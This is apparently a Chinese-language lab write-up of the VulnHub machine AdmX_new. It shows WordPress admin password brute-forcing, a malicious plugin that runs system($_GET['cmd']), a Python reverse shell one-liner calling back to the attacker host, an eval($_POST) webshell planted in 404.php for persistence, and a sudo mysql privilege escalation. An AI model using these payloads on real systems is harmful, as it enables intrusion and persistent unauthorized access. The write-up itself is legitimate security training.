# 相关信息

kali：10.0.0.3/24

靶机：10.0.0.4/24

靶机下载：https://download.vulnhub.com/admx/AdmX_new.7z

目标：获取两个 `flag` + root权限

难度：中

# 文字思路

## 全流程思路：

- 主机发现	端口扫描	
- web路径爬取：一个新工具 `feroxbuster`
- `burpsuite`自动替换：`burpsuite`新功能的学习
- 密码爆破         MSF漏洞模块利用
- wordpress漏洞利用：这个很有必要了解，给 `web`开发框架较为流行。同时后台的漏洞利用方式较为固定
- nc反弹shell升级：shell的升级，重中之重。很有操作的哇
- 蚁剑上线	
- 利用`mysql`提权：这个靶机的 `mysql`提权原理很是简单

## 下意识的操作

- 当网页访问时间过长或者其他异常特征，就需要对其源码和相关数据包进行分析
- 执行python脚本，python命令，定位python程序的时候，如果不成功最好将 `python,python2,python3`都尝试一遍。
- 终端文本显示不正确或者严重错位可以尝试缩小终端字体
- 记得蚁剑的持久化操作

## 主要的知识点

[==返回==](#tag8)<a id='back8'></a>

1. 进入网页后台后一般就是不断地寻找各种文件上传的漏洞，以下为一般的寻找点：==wordpress为例==
    - Appearence-Theme-Editor：修改网页的主题代码（不是全部后台都能修改网页的功能），可以添加修改一句话木马等。对于 `wordpress`就是指 `404`错误页面返回的修改，在其中添加一句话。

    - Media上传文件

    - Plugins：上传具有恶意代码的插件。

2. mysql的提权方式，还没学过。

# 具体流程

## 信息搜集

1. 主机发现，版本扫描，进行基本的信息搜集。

    <img src="https://image.cchl.fun/kali_image/image-20230602171440049.png" alt="image-20230602171440049" style="zoom:50%;" />

2. 靶机只开放了 `80`端口，这几乎决定了我们只有通过 `web`来进行渗透测试了。访问该靶机发布的网页为 `apache`的默认页面（==即使查看源码==）也是一无所获。所以我们使用一个新工具 `feroxbuster`来进行目录爬取。发现了两个重要的目录 `/wordpress，/wordpress/wp-admin`                               [==feroxbuster相关介绍==](#tag2)<a id='back2'></a>

    ```bash
    feroxbuster --url http://1.0.0.4 -w /usr/share/dirb/wordlists/common.txt
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230602182406005.png" alt="image-20230602182406005" style="zoom:50%;" />

3. 我们访问 `wordpress`目录的网页时虽然能正常的访问，但页面的加载时间很长（直接提醒我们得去查看网页源码或者 / burpsuite抓包分析）。同时我们浏览网页的基本内容，明显可以看出这只是个测试网站，一般而言测试网站的漏洞存在可能性比较大，他的各种访问权限设置的是比较松散的。

    <img src="https://image.cchl.fun/kali_image/image-20230602174853751.png" alt="image-20230602174853751" style="zoom:50%;" />

4. 通过 `burpsuite`抓包我们可以发现当访问 `/wordpress`的时候该网页会自动的向 `192.168.159.145`请求三个 `js`文件，通过 `burpsuite`的回包分析，我们有是可以很明显的这个`ip`是直接写入到响应代码中的。

    <img src="https://image.cchl.fun/kali_image/image-20230603091746114.png" alt="image-20230603091746114" style="zoom:50%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230603095753660.png" alt="image-20230603095753660" style="zoom: 67%;" />

5. 我们可以猜测这个 `ip`是靶机设计的时候的原本 `ip`。我们通过 `burpsuite`的 `Match and replace rules`功能自动的帮我们更改 `respnse`包中的`ip`内容为当前靶机的 `ip:1.0.0.4`，可以发现网页成功的渲染。但是当我们点击网页的每个连接发现都是没有任何反应的，而且再去复看网页源码也是一无所获。

    <img src="https://image.cchl.fun/kali_image/image-20230603095837110.png" alt="image-20230603095837110" style="zoom:67%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230603095855731.png" alt="image-20230603095855731" style="zoom:50%;" />

## 后台密码爆破

​		关于密码爆破在各类的渗透和比赛中的出现率高达百分之八十，可见密码爆破，社工字典的重要性。但是在打靶学习，看wp的过程中是无法避免的弱化我们对这个方面的认识的，==所以特此强调！！！==

1. 再次回到目录爬取获得的后台路径 `/wordpress/wp-admin`发现为一个登陆界面，我们可以通过大致的账户测试发现存在一个 `admin`的用户（==可以通过它的报错提示来判断我们猜的用户是否存在==）。然后就是通过 `burpsuite`来进行密码的爆破了，使用的是：[GitHub - Pagli0cci/FuzzDict: 自己整理和收集的字典](https://github.com/Pagli0cci/FuzzDict)   该 `github库`中的 `MidPwds.txt`。通过返回数据包的大小异常我们可以得出密码为 `adam14`。

    <img src="https://image.cchl.fun/kali_image/image-20230603100218368.png" alt="image-20230603100218368" style="zoom:50%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230603101937961.png" alt="image-20230603101937961" style="zoom:67%;" />

## wordpress后台漏洞

​		[==具体漏洞介绍哦，点击跳转==](#back8)<a id='tag8'></a>

​		这部分 ==利用python反弹利用漏洞和shell的升级是必须要做的==。我们后续的打靶过程统一使用 ==利用python反弹利用漏洞==获得的 `shell`，因为我们通过 `msf`获得 `shell`功能是不全的。

### 利用python反弹利用漏洞

1. 这里我们使用第三个方法 `plugins`漏洞，第一个方法更改 `404`我们没有权限无法修改第二个方法 `Media`也无法成功。

    ![image-20230603102045267](https://image.cchl.fun/kali_image/image-20230603102045267.png)

2. 我们上传一个自己编写的具有恶意代码的 `plugin`代码，其实该插件的编写非常非常的简单，就是 `php`简单的恶意代码，只需要注意一下两点：

    - 需要在代码的头部加上 `wordpress`固定的插件注释格式，插件才能被正确的识别。
    - 以 `zip`格式上传插件。

    这里我们的插件名就叫 `payload`。

    ```php
    <?php
    /*
    Plugin Name: payload
    Plugin URI: https://developer.wordpress.org/plugins/the-basics/
    Description: Basic WordPress Plugin Header Comment
    Version: 20160911
    Author: WordPress.org
    Author URI: https://developer.wordpress.org/
    License: GPL2
    License URI: https://www.gnu.org/licenses/gpl-2.0.html
    Text Domain: wporg
    Domain Path: /languages
    */
    if(isset($_GET['cmd'])){
        system($_GET['cmd']);
    }
        ?>
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230603102409309.png" alt="image-20230603102409309" style="zoom: 67%;" />

3. 在后台的管理界面激活上传的恶意插件，直接访问首页面就会触发插件。通过上载`payload：which python3`，我也是可以发现页面也是返回了我们想要的结果。（==注意==：记得开启 `burpsuite`来替换 `ip`，不然页面加载时间太长）

    <img src="https://image.cchl.fun/kali_image/image-20230603102603372.png" alt="image-20230603102603372" style="zoom:67%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230603102710020.png" alt="image-20230603102710020" style="zoom: 67%;" />

4. 我们自接上载 `payload`如下可以发现成功的利用 `python3`反弹 `shell` 突破边界。

    ```bash
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.0.0.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
    ```

    <img src="https://image.cchl.fun/kali_image/image-20230603104801657.png" alt="image-20230603104801657" style="zoom: 67%;" />
    
    

### 利用msf利用漏洞

1. 在 `kali`终端输入 `msfdb run`启动 `msf`漏洞工具，然后输入 `search admin wordpress`来检索相关的攻击模块，这里我们选择符合我们的场景的模块 `2`。

    <img src="https://image.cchl.fun/kali_image/image-20230603105054184.png" alt="image-20230603105054184" style="zoom: 50%;" />

    

2. 对各个参数进行相关的设置，然后 `run`再使用 `shell`来进行交互我们可以发现输入 `pwd,ls`等命令是无法成功的交互的。这种漏洞模块获取的 `shell`功能是不完善的。，pass掉。

    <img src="https://image.cchl.fun/kali_image/image-20230603105401756.png" alt="image-20230603105401756" style="zoom: 50%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230603105427696.png" alt="image-20230603105427696" style="zoom:50%;" />
    
    

### 蚁剑持久化

​		这一步在打靶的过程中其实是非必要的，==但在各类比赛中却尤为关键==。蚁剑能够帮助我们在上传后门代码后，对靶机进持久化，快速化的控制。建议在比赛中无论是获得了一个什么权限的 `shell`==最好都进行蚁剑的持久化操作==。

​		该蚁剑的持久化的恶意代码在该网页`wordpress`的  `twentytwentyone`主题下面的 `404.php`代码中加入一句话代码来实现的（网页的后台界面有说明该 `web`是什么主题，一句话木马：`eval($_POST['cchl'])`）。

​		但是当我们对文件进行修改的时候我们发现 `python`反弹的`shell`功能还是不全的，是无法使用全部功能的如：自动补全，光标的上下移动等等，让我们无法对 `404`文件进行修改。所以我们需要对当前的 `shell`进行升级。



### shell升级的条件

- 对方的靶机必须为 `bash`

- 自己的靶机也必须为 `bash`。但是由于现在的高版本的 `kali`的 `shell`为 `zsh`。我们需要按下面的图片操作然后重启 `kali`使修改生效

    <img src="https://image.cchl.fun/kali_image/image-20230603105551994.png" alt="image-20230603105551994" style="zoom:67%;" />

- 拿到 `shell`必须经过 `python3 -c 'import pty;pty.spawn("/bin/bash")'`的初步升级。（当然有的 `python`反弹`shell`的`payload`已经将该代码的功能包含进去了，只是我上文提供的`payload`没有包含 ）

    

### 升级的具体操作

1. 重启后再次利用`python的payload`建立连接。然后利用 `python3 -c 'import pty;pty.spawn("/bin/bash")'`来初步简单的升级`shell`，不过功能依然不完善。然后依次进行一些操作：

    - `ctrl + z`：将该 `nc`连接放入到后台

    - `stty raw -echo`：

        - `stty`: 控制终端行为的命令。
        - `raw`: 指示将终端设置为原始模式。在原始模式下，终端不会对输入进行处理，字符将直接传递给应用程序。
        - `-echo`: 指示禁用回显功能。通过禁用回显，输入的字符将不会在屏幕上显示出来。
        - 补充：`stty -raw echo`用来使终端恢复回显和显示输入字符的功能。

    - `fg`：将刚刚放入后台的 `nc`程序调到前台来运行，同时由于禁用了回显，你在图片中看不出 `fg`的输入。

    - `ls`：来判断是否成功将程序提到前台中

    - `export SHELL=/bin/bash`：设置 `shell`的换进变量为 `bash`

    - `export TERM=screen`：命令定义终端终端的类型，将屏幕为终端的类型。

    - `stty rows 38 columns 116`：这个命令设置终端的行数和列数

    - `reset`：就会成为一个完整的shell，什么命令补齐，交互的命令操作都是可以的使用的。

        <img src="https://image.cchl.fun/kali_image/image-20230603111249545.png" alt="image-20230603111249545" style="zoom: 67%;" />

2. 下面是升级完`shell`对 `404.php`修改的操作。至于蚁剑的靶机添加就不演示了，比较简单。

    <img src="https://image.cchl.fun/kali_image/image-20230603111750279.png" alt="image-20230603111750279" style="zoom: 67%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230603150826029.png" alt="image-20230603150826029" style="zoom: 67%;" />

    

## 信息收集

1. 我们浏览我们拿到的 `shell`的相关信息，首先就是 `html/wordpress`目录下的 `wp-config.php`了。里面包含了 `mysql`的登陆账户和密码。像这种密码信息的收集是非常重要的，以为在实际生活中==密码是存在大量的复用==现象，后面的渗透测试就是非常好的例子。

    <img src="https://image.cchl.fun/kali_image/image-20230603105926594.png" alt="image-20230603105926594" style="zoom:67%;" />

2. 当我们回到 `home`目录下发现了另一个用户 `wpadmin`。在其目录下有个非常明显的 `flag:local.txt`，但是他的权限是 `wpadmin`只读。

    <img src="C:/Users/27711/AppData/Roaming/Typora/typora-user-images/image-20230603152058221.png" alt="image-20230603152058221" style="zoom:67%;" />

## mysql提权漏洞

1. 当我们用 `mysql`数据库的密码尝试 切换为 `wpadmin`不正确，但是当我们使用登陆网页后台的 `adamin14`的时候发现竟然成功的登陆为 `wpadmin`用户，那么 `flag`也就自然而然的读取成功。(==内核漏洞也是需要尝试的，只是这个msyql的提权太过于明显==)

    <img src="https://image.cchl.fun/kali_image/image-20230603152319631.png" alt="image-20230603152319631" style="zoom: 67%;" />

2. 当我们进行收集的时候我们发现是可以利用 `sudo`来启动 `mysql`，我们有搜集到了 `mysql`的登陆用户和密码，所以自然而然的可成功的进入到数据库中。我们同时利用 `mysql`的 `system`命令来帮助我们直接以 `root`身份执行系统命令（==\ !是mysql命令中system的简写==）。然后我们直接利用 `\!`来使用 `/bin/bash`命令以 `root`的身份来使用 `shell`。那么接下来还是自然而然的拿下 `flag`

    <img src="https://image.cchl.fun/kali_image/image-20230603152647770.png" alt="image-20230603152647770" style="zoom: 61%;" />

# 相关工具/命令

## 命令

### reset

用于重置对当前 `shell`的配置。

### zip

1. what?

    一个压缩命令

2. 具体实例

    1. zip   a.zip  file：将file压缩为a.zip

### fg

1. what?

    `fg` 命令只能用于恢复在当前终端会话中挂起的作业。如果你关闭了终端或开启了新的终端会话，之前的挂起作业将不再存在。

2. 具体实例

    1. fg [作业号]：如果不指定会默然的恢复第一个挂起的。

## 工具

### feroxbuster

1. what?                                       [==返回==](#back2)<a id='tag2'></a>

    feroxbuster 是一个功能强大且灵活的目录发现工具，可以帮助用户在渗透测试、安全评估或红队操作中有效地扫描和探测目标网站的目录结构。

2. 具体实例

    1. feroxbuster --url http://1.0.0.4 -w /usr/share/dirb/wordlists/common.txt：
        - --url：指定爬取目标
        - -w：指定字典，==默认的字典是== `seclists`，该字典是需要安装的，所以直接使用可能会报错。

## 字典

### common.txt

1. /usr/share/dirb/wordlists/common.txt是dirb这个目录发现工具下的一个字典。

### MidPwds.txt


1. 为一个 `github`上的字典分享库中的一个字典。里面包含了大量的社工字典。          [==返回==](#tag1)<a id='back1'></a>

    [GitHub - Pagli0cci/FuzzDict: 自己整理和收集的字典](https://github.com/Pagli0cci/FuzzDict)

# 复盘/相关知识

## 重要 

### sudo的进一步理解

sudo的本质是让命令以root的身份运行。所以普通用户如果需要定制化的修改自己用户的配置加上 `sudo`可能是不成功的，会变成更改 `root`用户的配置了。

## 了解

### wordpress

WordPress 是一个流行的开源内容管理系统（CMS），广泛用于搭建和管理网站。虽然 WordPress 被广泛应用于博客网站，但它也可用于构建各种类型的网站，包括商业网站、社区论坛、电子商务平台等。
